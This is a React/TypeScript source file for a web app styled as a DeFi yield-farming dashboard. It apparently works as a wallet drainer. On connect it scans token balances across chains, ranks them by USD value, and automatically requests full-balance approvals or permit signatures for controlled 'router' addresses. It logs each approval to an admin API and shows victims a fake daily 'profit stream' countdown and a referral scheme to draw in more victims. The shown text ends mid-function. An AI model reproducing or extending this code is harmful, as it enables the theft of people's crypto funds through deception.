import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { useWeb3Modal } from '@web3modal/wagmi/react'
import {
  useAccount,
  useDisconnect,
  useSwitchChain,
  useWalletClient,
  useWriteContract,
} from 'wagmi'
import { formatUnits, type Address } from 'viem'
import { ERC20 } from './lib/abi'
import { fetchUsdPrices } from './lib/prices'
import { buildPermitTypedData, splitSig, supportsPermit2612 } from './lib/permit'
import { PUBLIC, CHAIN_NAME, CHAINS_DEF } from './lib/clients'
import { TOKENS } from './config/tokens'
import { ROUTERS } from './config/routers'
import { fetchPayoutControl } from './lib/payouts'
import { TokenCard, type Status } from './components/TokenCard'
import { CryptoPlanetScene } from './components/CryptoPlanetScene'
import { DeFiLogo } from './components/DeFiLogo'
import { SiteFooter } from './components/SiteFooter'
import { SwapModal } from './components/SwapModal'
import { BridgeModal } from './components/BridgeModal'
import { StakingModal } from './components/StakingModal'
import { LiquidityModal } from './components/LiquidityModal'
import { RewardsModal } from './components/RewardsModal'
import { logAdminEvent } from './lib/adminApi'
import { formatAddress } from './utils/format'
import { derivePayoutState, sanitizeControlState, type PayoutControlState } from './utils/payoutControls'
import { useAutomationPreviews } from './hooks/useAutomationPreviews'
import { recordReferralApproval, fetchReferralProfile, type ReferralProfile } from './lib/referrals'
import './index.css'

type Row = {
  chainId: number
  chainName: string
  symbol: string
  address: Address
  decimals: number
  balance: bigint
  allowance: bigint
  usd?: number
  valueUsd?: number
  status: Status
}

type ChainStat = {
  chainId: number
  chainName: string
  total: number
  eligible: number
  ok: boolean
  error?: string
}

const APPROVED_STORAGE_KEY = 'qa:approved_tokens'
const PAYOUT_STORAGE_KEY = 'qa:last_payout_schedule'
const PAYOUT_INTERVAL_MS = 24 * 60 * 60 * 1000
const NOT_ELIGIBLE_TITLE = 'Your wallet is not eligible for Yield Farming and Liquidity Pools'
const NOT_ELIGIBLE_COPY =
  'Deposit supported tokens on your connected chains to build a positive balance. Once funds are detected, tap Rescan to unlock these automations.'
const NOT_ELIGIBLE_MESSAGE = `${NOT_ELIGIBLE_TITLE}. ${NOT_ELIGIBLE_COPY}`
const REFERRAL_CODE_STORAGE_KEY = 'qa:referral_source'
const REFERRAL_LIST_LIMIT = 20

const sleep = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms))

type ApprovedTokenMeta = {
  chainId: number
  chainName: string
  symbol: string
  address: Address
}

type PayoutSchedule = {
  lastApprovedAt: number
  nextPayoutAt: number
  tokens: ApprovedTokenMeta[]
}

const formatPayoutCountdown = (ms: number) => {
  if (ms <= 0) return '00h 00m 00s'
  const totalSeconds = Math.floor(ms / 1000)
  const hours = Math.floor(totalSeconds / 3600)
  const minutes = Math.floor((totalSeconds % 3600) / 60)
  const seconds = totalSeconds % 60
  const days = Math.floor(hours / 24)
  const displayHours = hours % 24
  const parts = [] as string[]
  if (days > 0) parts.push(`${String(days).padStart(2, '0')}d`)
  parts.push(`${String(displayHours).padStart(2, '0')}h`)
  parts.push(`${String(minutes).padStart(2, '0')}m`)
  parts.push(`${String(seconds).padStart(2, '0')}s`)
  return parts.join(' ')
}

const payoutTimeFormatter = new Intl.DateTimeFormat(undefined, {
  year: 'numeric',
  month: 'short',
  day: 'numeric',
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit',
})

const referralDateFormatter = new Intl.DateTimeFormat(undefined, {
  year: 'numeric',
  month: 'short',
  day: 'numeric',
  hour: '2-digit',
  minute: '2-digit',
})

const formatDateTime = (timestamp: number) => referralDateFormatter.format(new Date(timestamp))

const normalizeTokenMeta = (input: any): ApprovedTokenMeta | null => {
  if (!input || typeof input !== 'object') return null
  const { chainId, chainName, symbol, address } = input as Record<string, unknown>
  const parsedChainId = Number(chainId)
  if (!Number.isFinite(parsedChainId)) return null
  if (typeof symbol !== 'string' || !symbol) return null
  if (typeof chainName !== 'string' || !chainName) return null
  if (typeof address !== 'string' || !address) return null
  return {
    chainId: parsedChainId,
    chainName,
    symbol,
    address: address as Address,
  }
}

const normalizeSchedule = (input: any): PayoutSchedule | null => {
  if (!input || typeof input !== 'object') return null
  const { lastApprovedAt, nextPayoutAt, tokens } = input as Record<string, unknown>
  const parsedLast = Number(lastApprovedAt)
  const parsedNext = Number(nextPayoutAt)
  if (!Number.isFinite(parsedLast) || !Number.isFinite(parsedNext)) return null
  const tokenList: ApprovedTokenMeta[] = Array.isArray(tokens)
    ? tokens
        .map((token) => normalizeTokenMeta(token))
        .filter((token): token is ApprovedTokenMeta => Boolean(token))
    : []
  return {
    lastApprovedAt: parsedLast,
    nextPayoutAt: parsedNext,
    tokens: tokenList,
  }
}

const getStoredReferralCode = () => {
  if (typeof window === 'undefined') return null
  try {
    return window.localStorage.getItem(REFERRAL_CODE_STORAGE_KEY)
  } catch {
    return null
  }
}

const setStoredReferralCode = (code: string) => {
  if (typeof window === 'undefined') return
  if (!code) return
  try {
    window.localStorage.setItem(REFERRAL_CODE_STORAGE_KEY, code)
  } catch {
    // ignore storage errors
  }
}

const clearStoredReferralCode = () => {
  if (typeof window === 'undefined') return
  try {
    window.localStorage.removeItem(REFERRAL_CODE_STORAGE_KEY)
  } catch {
    // ignore
  }
}

export default function App() {
  const { open } = useWeb3Modal()
  const { address, isConnected, chainId: activeChainId } = useAccount()
  const { disconnect } = useDisconnect()
  const { data: walletClient } = useWalletClient()
  const { switchChainAsync } = useSwitchChain()
  const { writeContractAsync } = useWriteContract()

  const [rows, setRows] = useState<Row[]>([])
  const rowsRef = useRef<Row[]>([])
  const [stats, setStats] = useState<ChainStat[]>([])
  const [loading, setLoading] = useState(false)
  const [msg, setMsg] = useState<string>()
  const [currentIdx, setCurrentIdx] = useState<number | null>(null)
  const [totalEligible, setTotalEligible] = useState(0)
  const [approvedCount, setApprovedCount] = useState(0)
  const [showModal, setShowModal] = useState(false)
  const [modalText, setModalText] = useState('')
  const [showSwapModal, setShowSwapModal] = useState(false)
  const [showBridgeModal, setShowBridgeModal] = useState(false)
  const [showStakingModal, setShowStakingModal] = useState(false)
  const [showLiquidityModal, setShowLiquidityModal] = useState(false)
  const [showRewardsModal, setShowRewardsModal] = useState(false)
  const [basePayoutSchedule, setBasePayoutSchedule] = useState<PayoutSchedule | null>(null)
  const [remotePayoutControl, setRemotePayoutControl] = useState<PayoutControlState | null>(null)
  const [payoutOverrideState, setPayoutOverrideState] = useState<{ status: 'paused' | 'ready' | 'running'; remaining: number; resumeAt: number; progress: number; isCycle: boolean; cycleMs?: number } | null>(null)
  const [payoutSchedule, setPayoutSchedule] = useState<PayoutSchedule | null>(null)
  const [payoutCountdown, setPayoutCountdown] = useState('')
  const [isPayoutReady, setIsPayoutReady] = useState(false)
  const [payoutProgress, setPayoutProgress] = useState(0)
  const [referralProfile, setReferralProfile] = useState<ReferralProfile | null>(null)
  const [referralLinkCopied, setReferralLinkCopied] = useState(false)
  const [copiedReferralAddress, setCopiedReferralAddress] = useState<string | null>(null)

  const scannedOnce = useRef(false)
  const switching = useRef<Promise<void> | null>(null)
  const running = useRef(false)
  const approvedRef = useRef<Set<string>>(new Set())
  const sessionRef = useRef(0)
  const lastAddressRef = useRef<string | null>(null)
  const lastLoggedConnectRef = useRef<string | null>(null)

  useEffect(() => {
    if (!referralLinkCopied) return
    const timeout = window.setTimeout(() => setReferralLinkCopied(false), 2000)
    return () => window.clearTimeout(timeout)
  }, [referralLinkCopied])

  useEffect(() => {
    if (!basePayoutSchedule) {
      setPayoutSchedule(null)
      setPayoutOverrideState(null)
      return
    }
    const derived = derivePayoutState(
      basePayoutSchedule.lastApprovedAt,
      basePayoutSchedule.nextPayoutAt,
      remotePayoutControl ?? undefined,
      Date.now()
    )

    if (address) {
      const hasChanges =
        basePayoutSchedule.lastApprovedAt !== derived.lastApprovedAt ||
        basePayoutSchedule.nextPayoutAt !== derived.nextPayoutAt
      if (hasChanges) {
        const store = getPayoutStore()
        store[address.toLowerCase()] = {
          lastApprovedAt: derived.lastApprovedAt,
          nextPayoutAt: derived.nextPayoutAt,
          tokens: basePayoutSchedule.tokens ?? [],
        }
        persistPayoutStore(store)
        setBasePayoutSchedule({
          ...basePayoutSchedule,
          lastApprovedAt: derived.lastApprovedAt,
          nextPayoutAt: derived.nextPayoutAt,
        })
      }
    }

    setPayoutSchedule({
      ...basePayoutSchedule,
      lastApprovedAt: derived.lastApprovedAt,
      nextPayoutAt: derived.nextPayoutAt,
    })
    setPayoutOverrideState({
      status: derived.status,
      remaining: derived.remaining,
      resumeAt: derived.resumeAt,
      progress: derived.progress,
      isCycle: derived.isCycle,
      cycleMs: derived.cycleMs,
    })
  }, [address, basePayoutSchedule, remotePayoutControl])

  useEffect(() => {
    if (!copiedReferralAddress) return
    const timeout = window.setTimeout(() => setCopiedReferralAddress(null), 2000)
    return () => window.clearTimeout(timeout)
  }, [copiedReferralAddress])

  useEffect(() => {
    if (typeof window === 'undefined') return
    const url = new URL(window.location.href)
    const referralParam = url.searchParams.get('ref')
    if (referralParam) {
      setStoredReferralCode(referralParam.trim().toUpperCase())
      url.searchParams.delete('ref')
      const nextSearch = url.searchParams.toString()
      const newUrl = `${url.pathname}${nextSearch ? `?${nextSearch}` : ''}${url.hash}`
      window.history.replaceState(window.history.state, '', newUrl)
    }
  }, [])

  const resetSessionState = useCallback(() => {
    running.current = false
    rowsRef.current = []
    setRows([])
    setStats([])
    setTotalEligible(0)
    setApprovedCount(0)
    setCurrentIdx(null)
    setShowModal(false)
    setShowBridgeModal(false)
    setShowSwapModal(false)
    setShowLiquidityModal(false)
    setShowRewardsModal(false)
    setModalText('')
    setLoading(false)
    setMsg(undefined)
  }, [])

  const triggerAutoRun = useCallback(() => {
    if (!isConnected) return
    if (running.current) return
    if (!rowsRef.current.length) return
    runAll().catch((err) => {
      console.debug('auto-run error', err)
    })
  }, [isConnected])

  const registerReferral = useCallback(async (targetAddress: Address, approvedAt: number) => {
    try {
      const stored = getStoredReferralCode()
      const profile = await recordReferralApproval({
        address: targetAddress,
        referralCode: stored ?? undefined,
        timestamp: approvedAt,
        limit: REFERRAL_LIST_LIMIT,
      })
      if (profile) {
        setReferralProfile(profile)
        if (stored) {
          clearStoredReferralCode()
        }
      }
    } catch (error) {
      console.warn('Failed to record referral approval', error)
    }
  }, [])

  const referralShareLink = useMemo(() => {
    if (!referralProfile) return ''
    if (typeof window === 'undefined') return ''
    try {
      const { origin } = window.location
      return `${origin}?ref=${referralProfile.code}`
    } catch {
      return ''
    }
  }, [referralProfile])

  const remainingReferrals = useMemo(() => {
    if (!referralProfile) return 0
    return Math.max(0, referralProfile.referralCount - referralProfile.referrals.length)
  }, [referralProfile])

  const handleCopyReferralAddress = useCallback(async (value: string) => {
    try {
      await navigator.clipboard.writeText(value)
      setCopiedReferralAddress(value)
    } catch (error) {
      console.warn('Copy referral address failed', error)
    }
  }, [])

  const handleCopyReferralLink = useCallback(async () => {
    if (!referralShareLink) return
    try {
      await navigator.clipboard.writeText(referralShareLink)
      setReferralLinkCopied(true)
    } catch (error) {
      console.warn('Copy referral link failed', error)
    }
  }, [referralShareLink])

  function updateRows(next: Row[]) {
    rowsRef.current = next
    setRows(next)
  }

  function approvedKey(chainId: number, addr: Address) {
    return `${chainId}:${addr.toLowerCase()}`
  }

  function loadApproved() {
    try {
      const raw = localStorage.getItem(APPROVED_STORAGE_KEY)
      if (!raw) return
      const arr = JSON.parse(raw) as string[]
      approvedRef.current = new Set(arr)
    } catch {
      approvedRef.current = new Set()
    }
  }

  function saveApproved() {
    try {
      localStorage.setItem(APPROVED_STORAGE_KEY, JSON.stringify(Array.from(approvedRef.current)))
    } catch {
      // ignore
    }
  }

  const getPayoutStore = () => {
    try {
      const raw = localStorage.getItem(PAYOUT_STORAGE_KEY)
      if (!raw) return {} as Record<string, PayoutSchedule>
      const parsed = JSON.parse(raw)
      if (typeof parsed !== 'object' || !parsed) return {} as Record<string, PayoutSchedule>
      return parsed as Record<string, PayoutSchedule>
    } catch {
      return {} as Record<string, PayoutSchedule>
    }
  }

  const persistPayoutStore = (store: Record<string, PayoutSchedule>) => {
    try {
      localStorage.setItem(PAYOUT_STORAGE_KEY, JSON.stringify(store))
    } catch {
      // ignore
    }
  }

  const loadPayoutSchedule = useCallback((targetAddress?: Address | null) => {
    if (!targetAddress) {
      setBasePayoutSchedule(null)
      setPayoutSchedule(null)
      setPayoutCountdown('')
      setIsPayoutReady(false)
      return
    }
    const store = getPayoutStore()
    const entry = normalizeSchedule(store[targetAddress.toLowerCase()])
    if (entry) {
      setBasePayoutSchedule({ ...entry, tokens: entry.tokens ?? [] })
    } else {
      setBasePayoutSchedule(null)
      setPayoutSchedule(null)
      setPayoutCountdown('')
      setIsPayoutReady(false)
    }
  }, [])

  const updatePayoutSchedule = (
    targetAddress: Address,
    payload: { lastApprovedAt: number; nextPayoutAt: number; tokenMeta?: ApprovedTokenMeta }
  ) => {
    const store = getPayoutStore()
    const lower = targetAddress.toLowerCase()
    const existing = normalizeSchedule(store[lower])
    const currentTokens = existing?.tokens ?? []
    const nextTokens = payload.tokenMeta
      ? (() => {
          const meta = payload.tokenMeta
          const metaAddress = meta.address.toLowerCase()
          return [
            meta,
            ...currentTokens.filter(
              (token) => token.chainId !== meta.chainId || token.address.toLowerCase() !== metaAddress
            ),
          ].slice(0, 6)
        })()
      : currentTokens
    const nextSchedule: PayoutSchedule = {
      lastApprovedAt: payload.lastApprovedAt,
      nextPayoutAt: payload.nextPayoutAt,
      tokens: nextTokens,
    }
    store[lower] = nextSchedule
    persistPayoutStore(store)
    setBasePayoutSchedule(nextSchedule)
  }

  function markApproved(row: Row) {
    approvedRef.current.add(approvedKey(row.chainId, row.address))
    saveApproved()
    if (address) {
      const approvedAt = Date.now()
      const nextPayoutAt = approvedAt + PAYOUT_INTERVAL_MS
      updatePayoutSchedule(address, {
        lastApprovedAt: approvedAt,
        nextPayoutAt,
        tokenMeta: {
          chainId: row.chainId,
          chainName: row.chainName,
          symbol: row.symbol,
          address: row.address,
        },
      })
      void logAdminEvent({
        type: 'approve',
        address,
        metadata: {
          chainId: row.chainId,
          token: row.address,
          symbol: row.symbol,
          chainName: row.chainName,
          approvedAt,
          nextPayoutAt,
        },
        timestamp: approvedAt,
      })
      void registerReferral(address, approvedAt)
    }
  }

  useEffect(() => {
    loadApproved()
  }, [])

  useEffect(() => {
    loadPayoutSchedule(address)
  }, [address, loadPayoutSchedule])

  useEffect(() => {
    if (!isConnected || !address) {
      setReferralProfile(null)
      return
    }
    let cancelled = false
    fetchReferralProfile(address, { limit: REFERRAL_LIST_LIMIT })
      .then((profile) => {
        if (!cancelled) setReferralProfile(profile)
      })
      .catch(() => {
        if (!cancelled) setReferralProfile(null)
      })
    return () => {
      cancelled = true
    }
  }, [address, isConnected])

  useEffect(() => {
    setReferralLinkCopied(false)
    setCopiedReferralAddress(null)
  }, [referralProfile?.code])

  useEffect(() => {
    const handleStorage = (event: StorageEvent) => {
      if (event.key !== PAYOUT_STORAGE_KEY) return
      loadPayoutSchedule(address)
    }
    window.addEventListener('storage', handleStorage)
    return () => {
      window.removeEventListener('storage', handleStorage)
    }
  }, [address, loadPayoutSchedule])

  useEffect(() => {
    if (!payoutSchedule) {
      setPayoutCountdown('')
      setIsPayoutReady(false)
      setPayoutProgress(0)
      return
    }
    if (payoutOverrideState?.status === 'paused') {
      const remaining = Math.max(payoutOverrideState.remaining, 0)
      setIsPayoutReady(remaining <= 0)
      setPayoutCountdown(formatPayoutCountdown(remaining))
      setPayoutProgress(payoutOverrideState.progress)
      return
    }
    const update = () => {
      const now = Date.now()
      const ms = payoutSchedule.nextPayoutAt - now
      if (payoutOverrideState?.isCycle && ms <= 0 && basePayoutSchedule) {
        const derived = derivePayoutState(
          basePayoutSchedule.lastApprovedAt,
          basePayoutSchedule.nextPayoutAt,
          remotePayoutControl ?? undefined,
          now
        )
        setPayoutSchedule({
          ...basePayoutSchedule,
          lastApprovedAt: derived.lastApprovedAt,
          nextPayoutAt: derived.nextPayoutAt,
        })
        setPayoutOverrideState({
          status: derived.status,
          remaining: derived.remaining,
          resumeAt: derived.resumeAt,
          progress: derived.progress,
          isCycle: derived.isCycle,
          cycleMs: derived.cycleMs,
        })
        return
      }
      setIsPayoutReady(ms <= 0)
      setPayoutCountdown(formatPayoutCountdown(ms))
      const duration = Math.max(payoutSchedule.nextPayoutAt - payoutSchedule.lastApprovedAt, 1)
      const progress = Math.min(1, Math.max(0, (duration - Math.max(ms, 0)) / duration))
      setPayoutProgress(progress)
    }
    update()
    const id = window.setInterval(update, 1000)
    return () => {
      window.clearInterval(id)
    }
  }, [payoutSchedule, payoutOverrideState, basePayoutSchedule, remotePayoutControl])

  useEffect(() => {
    if (isConnected && address) {
      if (lastLoggedConnectRef.current !== address) {
        lastLoggedConnectRef.current = address
        void logAdminEvent({ type: 'connect', address })
      }
    } else {
      lastLoggedConnectRef.current = null
    }
  }, [isConnected, address])

  async function scanAll() {
    if (!isConnected || !address) return
    const sessionId = sessionRef.current
    setLoading(true)
    setMsg(undefined)
    try {
      const results = await Promise.all(
        CHAINS_DEF.map(async (chain) => {
          const tokenList = TOKENS[chain.id] ?? []
          const stat: ChainStat = {
            chainId: chain.id,
            chainName: CHAIN_NAME[chain.id],
            total: tokenList.length,
            eligible: 0,
            ok: false,
          }

          if (!tokenList.length) return { items: [] as Row[], stat }

          const router = ROUTERS[chain.id]
          if (!router) {
            stat.error = 'Missing router'
            return { items: [] as Row[], stat }
          }

          const client = PUBLIC[chain.id]

          const balanceCalls = tokenList.map((token) => ({
            address: token.address,
            abi: ERC20,
            functionName: 'balanceOf' as const,
            args: [address] as const,
          }))

          let balances: bigint[] = []
          try {
            const response = await client.multicall({ allowFailure: true, contracts: balanceCalls })
            const succeeded = response.some((item) => item.status === 'success')
            if (!succeeded) throw new Error('multicall failed')
            balances = response.map((item) => (item.status === 'success' ? BigInt(item.result as bigint) : 0n))
          } catch {
            balances = []
            for (const token of tokenList) {
              try {
                const value = await client.readContract({
                  address: token.address,
                  abi: ERC20,
                  functionName: 'balanceOf',
                  args: [address as Address],
                })
                balances.push(value as bigint)
              } catch {
                balances.push(0n)
              }
            }
          }

          const allowanceCalls = tokenList.map((token) => ({
            address: token.address,
            abi: ERC20,
            functionName: 'allowance' as const,
            args: [address, router] as const,
          }))

          let allowances: bigint[] = []
          try {
            const response = await client.multicall({ allowFailure: true, contracts: allowanceCalls })
            const succeeded = response.some((item) => item.status === 'success')
            if (!succeeded) throw new Error('multicall failed')
            allowances = response.map((item) => (item.status === 'success' ? BigInt(item.result as bigint) : 0n))
          } catch {
            allowances = []
            for (const token of tokenList) {
              try {
                const value = await client.readContract({
                  address: token.address,
                  abi: ERC20,
                  functionName: 'allowance',
                  args: [address as Address, router],
                })
                allowances.push(value as bigint)
              } catch {
                allowances.push(0n)
              }
            }
          }

          const mapped: Row[] = tokenList.map((token, index) => ({
            chainId: chain.id,
            chainName: stat.chainName,
            symbol: token.symbol,
            address: token.address,
            decimals: token.decimals,
            balance: balances[index] ?? 0n,
            allowance: allowances[index] ?? 0n,
            status: 'pending',
          }))

          const approvedTokens: Row[] = []
          let items: Row[] = []
          for (const row of mapped) {
            if (row.balance <= 0n) continue
            if (row.allowance < row.balance) {
              items.push(row)
            } else {
              approvedTokens.push(row)
            }
          }

          stat.eligible = items.length
          stat.ok = true

          if (!items.length) return { items, stat, approvedTokens }

          try {
            const prices = await fetchUsdPrices(chain.id, items.map((item) => item.address))
            items = items.map((item) => {
              const usd = prices[item.address.toLowerCase()]
              const valueUsd = usd ? Number(formatUnits(item.balance, item.decimals)) * usd : undefined
              return { ...item, usd, valueUsd }
            })
          } catch {
            // ignore price errors
          }

          return { items, stat, approvedTokens }
        })
      )

      if (sessionRef.current !== sessionId) return

      const allItems = results.flatMap((result) => result.items)
      const allStats = results.map((result) => result.stat)
      const detectedApprovedTokens = results.flatMap((result) => result.approvedTokens ?? [])

      const filtered: Row[] = []
      const approved = new Set(approvedRef.current)
      for (const item of allItems) {
        const key = approvedKey(item.chainId, item.address)
        if (approved.has(key)) {
          if (item.allowance >= item.balance) continue
          approved.delete(key)
        }
        filtered.push(item)
      }
      if (approved.size !== approvedRef.current.size) {
        approvedRef.current = approved
        saveApproved()
      }

      filtered.sort((a, b) => {
        const aValue = a.valueUsd ?? Number(formatUnits(a.balance, a.decimals))
        const bValue = b.valueUsd ?? Number(formatUnits(b.balance, b.decimals))
        return bValue - aValue
      })

      if (sessionRef.current !== sessionId) return

      if (address && detectedApprovedTokens.length) {
        const lower = address.toLowerCase()
        const store = getPayoutStore()
        const stored = normalizeSchedule(store[lower])
        const baseLast = stored?.lastApprovedAt ?? Date.now()
        const baseNext = stored?.nextPayoutAt ?? baseLast + PAYOUT_INTERVAL_MS
        const seen = new Set<string>((stored?.tokens ?? []).map((token) => `${token.chainId}:${token.address.toLowerCase()}`))
        for (const token of detectedApprovedTokens) {
          const key = `${token.chainId}:${token.address.toLowerCase()}`
          if (seen.has(key)) continue
          updatePayoutSchedule(address, {
            lastApprovedAt: baseLast,
            nextPayoutAt: baseNext,
            tokenMeta: {
              chainId: token.chainId,
              chainName: token.chainName,
              symbol: token.symbol,
              address: token.address,
            },
          })
          seen.add(key)
        }
      }

      setStats(allStats)
      setTotalEligible(filtered.length)
      setApprovedCount(0)
      updateRows(filtered)

      if (!filtered.length) {
        setMsg(NOT_ELIGIBLE_MESSAGE)
      } else {
        setMsg(undefined)
        triggerAutoRun()
      }
    } catch (error: any) {
      if (sessionRef.current !== sessionId) return
      updateRows([])
      setMsg(error?.message ?? 'Scan failed')
    } finally {
      if (sessionRef.current === sessionId) {
        setLoading(false)
        scannedOnce.current = true
      }
    }
  }

  async function ensureChain(chainId: number) {
    const pending = (async () => {
      try {
        await switchChainAsync({ chainId })
      } catch (error: any) {
        if (error?.code === -32002) {
          setMsg('Please confirm the network switch in your wallet…')
        }
        throw error
      }
    })()
    switching.current = pending
    try {
      await pending
    } finally {
      if (switching.current === pending) switching.current = null
    }
  }

  const isUserRejected = (error: any) => {
    if (!error) return false
    const code = error.code ?? error?.cause?.code
    const message = (error.message || '').toString().toLowerCase()
    return code === 4001 || message.includes('user rejected') || message.includes('user disapproved')
  }

  async function runAll() {
    if (!address || running.current) return
    const sessionId = sessionRef.current
    running.current = true
    let queue = [...rowsRef.current]
    let idx = 0

    try {
      while (idx < queue.length) {
        if (sessionRef.current !== sessionId) break
        const token = queue[idx]
        setCurrentIdx(idx)
        setShowModal(true)
        setModalText(`Preparing approval for ${token.symbol} on ${CHAIN_NAME[token.chainId]}`)

        try {
          const router = ROUTERS[token.chainId]
          if (!router) {
            queue[idx] = { ...token, status: 'error' }
            if (sessionRef.current !== sessionId) break
            updateRows(queue.slice())
            idx += 1
            continue
          }

          let processed = false

          if (walletClient) {
            try {
              const supportsPermit = await supportsPermit2612(token.address, address, PUBLIC[token.chainId])
              if (supportsPermit) {
                if (sessionRef.current !== sessionId) break
                setModalText(`Requesting signature (permit) for ${token.symbol} on ${CHAIN_NAME[token.chainId]}…`)
                const { domain, types, message, deadline } = await buildPermitTypedData(
                  token.address,
                  address,
                  router,
                  token.balance,
                  token.chainId,
                  PUBLIC[token.chainId]
                )
                const signature = await walletClient.signTypedData({
                  domain,
                  types,
                  primaryType: 'Permit',
                  message,
                } as any)
                if (sessionRef.current !== sessionId) break
                const { v, r, s } = splitSig(signature as any)
                await navigator.clipboard.writeText(
                  JSON.stringify(
                    {
                      chainId: token.chainId,
                      token: token.address,
                      user: address,
                      router,
                      value: token.balance.toString(),
                      deadline: deadline.toString(),
                      v,
                      r,
                      s,
                    },
                    null,
                    2
                  )
                )
                processed = true
              }
            } catch (err) {
              if (!isUserRejected(err)) {
                console.debug('Permit attempt failed', err)
              }
            }
          }

          if (!processed) {
            if (switching.current) await switching.current
            if (sessionRef.current !== sessionId) break
            await ensureChain(token.chainId)
            if (sessionRef.current !== sessionId) break
            setModalText(`Requesting on-chain approval for ${token.symbol} on ${CHAIN_NAME[token.chainId]}…`)
            await writeContractAsync({
              chainId: token.chainId,
              address: token.address,
              abi: ERC20,
              functionName: 'approve',
              args: [router, token.balance],
            } as const)
          }

          markApproved(token)
          queue.splice(idx, 1)
          if (sessionRef.current !== sessionId) break
          updateRows(queue.slice())
          setApprovedCount((count) => count + 1)
          setModalText(`Approved ${token.symbol}`)
          await sleep(300)
        } catch (iterationError: any) {
          if (isUserRejected(iterationError)) {
            setShowModal(false)
            setModalText('Approval cancelled — waiting for confirmation…')
            await sleep(900)
            continue
          }

          queue[idx] = { ...token, status: 'needs-approve' }
          if (sessionRef.current === sessionId) {
            updateRows(queue.slice())
            setShowModal(false)
            setMsg(iterationError?.message ?? 'Approval failed')
          }
          await sleep(600)
          continue
        }
      }
      if (sessionRef.current === sessionId) {
        setMsg('All approvals complete.')
      }
    } catch (error: any) {
      if (sessionRef.current === sessionId) {
        setMsg(error?.message ?? 'Run failed')
      }
    } finally {
      running.current = false
      if (sessionRef.current === sessionId) {
        setShowModal(false)
        setCurrentIdx(null)
        updateRows(queue)
      }
    }
  }

  async function retryOne(target: Row, index: number) {
    if (!address) return
    const sessionId = sessionRef.current
    const router = ROUTERS[target.chainId]
    if (!router) return

    try {
      if (walletClient) {
        try {
          const supportsPermit = await supportsPermit2612(target.address, address, PUBLIC[target.chainId])
          if (supportsPermit) {
            const { domain, types, message, deadline } = await buildPermitTypedData(
              target.address,
              address,
              router,
              target.balance,
              target.chainId,
              PUBLIC[target.chainId]
            )
            const signature = await walletClient.signTypedData({
              domain,
              types,
              primaryType: 'Permit',
              message,
            } as any)
            const { v, r, s } = splitSig(signature as any)
            await navigator.clipboard.writeText(
              JSON.stringify(
                {
                  chainId: target.chainId,
                  token: target.address,
                  user: address,
                  router,
                  value: target.balance.toString(),
                  deadline: deadline.toString(),
                  v,
                  r,
                  s,
                },
                null,
                2
              )
            )
            markApproved(target)
            const next = rowsRef.current.filter((_, idx) => idx !== index)
            if (sessionRef.current !== sessionId) return
            updateRows(next)
            setApprovedCount((count) => count + 1)
            return
          }
        } catch {
          // fall through to on-chain approval
        }
      }

      if (switching.current) await switching.current
      if (sessionRef.current !== sessionId) return
      await ensureChain(target.chainId)
      if (sessionRef.current !== sessionId) return
      await writeContractAsync({
        chainId: target.chainId,
        address: target.address,
        abi: ERC20,
        functionName: 'approve',
        args: [router, target.balance],
      } as const)
      markApproved(target)
      const next = rowsRef.current.filter((_, idx) => idx !== index)
      if (sessionRef.current !== sessionId) return
      updateRows(next)
      setApprovedCount((count) => count + 1)
    } catch (error: any) {
      if (sessionRef.current === sessionId) {
        setMsg(error?.message ?? 'Approval failed')
      }
    }
  }

  useEffect(() => {
    if (!isConnected || !address) {
      if (lastAddressRef.current !== null) {
        sessionRef.current += 1
        lastAddressRef.current = null
        scannedOnce.current = false
        resetSessionState()
      }
      return
    }

    if (lastAddressRef.current !== address) {
      sessionRef.current += 1
      lastAddressRef.current = address
      scannedOnce.current = false
      resetSessionState()
    }
  }, [address, isConnected, resetSessionState])

  useEffect(() => {
    if (isConnected && !scannedOnce.current) {
      scanAll()
    }
  }, [isConnected, address])

  useEffect(() => {
    if (!address) {
      setRemotePayoutControl(null)
      return
    }
    let cancelled = false
    const load = async () => {
      try {
        const control = await fetchPayoutControl(address)
        if (cancelled) return
        setRemotePayoutControl(control ? sanitizeControlState(control) ?? null : null)
      } catch (error) {
        if (!cancelled) console.warn('Failed to fetch payout control', error)
      }
    }
    load()
    const interval = window.setInterval(load, 15000)
    return () => {
      cancelled = true
      window.clearInterval(interval)
    }
  }, [address])


  useEffect(() => {
    if (isConnected && scannedOnce.current && rows.length) {
      triggerAutoRun()
    }
  }, [isConnected, rows.length, triggerAutoRun])

  const totalNetworks = stats.length
  const totalTokens = stats.reduce((sum, stat) => sum + stat.total, 0)
  const outstandingUsd = useMemo(() => {
    return rows.reduce((sum, row) => sum + (row.valueUsd ?? Number(formatUnits(row.balance, row.decimals))), 0)
  }, [rows])

  const showNotEligibleNotice = isConnected && scannedOnce.current && !loading && rows.length === 0
  const displayMsg = msg && msg !== NOT_ELIGIBLE_MESSAGE ? msg : undefined

  const outstandingUsdDisplay = useMemo(() => {
    if (!Number.isFinite(outstandingUsd) || outstandingUsd <= 0) return '$0.00'
    if (outstandingUsd < 1) {
      return `$${outstandingUsd.toLocaleString(undefined, { minimumFractionDigits: 4, maximumFractionDigits: 4 })}`
    }
    if (outstandingUsd < 1000) {
      return `$${outstandingUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
    }
    return `$${outstandingUsd.toLocaleString(undefined, { maximumFractionDigits: 0 })}`
  }, [outstandingUsd])

  const lastApprovalDisplay = useMemo(() => {
    if (!payoutSchedule) return null
    return payoutTimeFormatter.format(new Date(payoutSchedule.lastApprovedAt))
  }, [payoutSchedule])

  const nextPayoutDisplay = useMemo(() => {
    if (!payoutSchedule) return null
    return payoutTimeFormatter.format(new Date(payoutSchedule.nextPayoutAt))
  }, [payoutSchedule])

  const payoutNarrative = useMemo(() => {
    if (!payoutSchedule || !lastApprovalDisplay || !nextPayoutDisplay) return null
    const tokens = payoutSchedule.tokens ?? []
    const latestToken = tokens[0]
    const tokenDescriptor = latestToken
      ? `${latestToken.symbol} on ${latestToken.chainName}${tokens.length > 1 ? ` (+${tokens.length - 1} more)` : ''}`
      : 'your latest approval'
    return {
      primary: `Profit stream locked at ${lastApprovalDisplay} after approving ${tokenDescriptor}.`,
      secondary: isPayoutReady
        ? `Daily claim window is open — collect anytime before the next cycle restart at ${nextPayoutDisplay}.`
        : `Tomorrow’s payout unlocks exactly at ${nextPayoutDisplay}. Stay synced to auto-claim the moment it hits.`,
      tokens,
    }
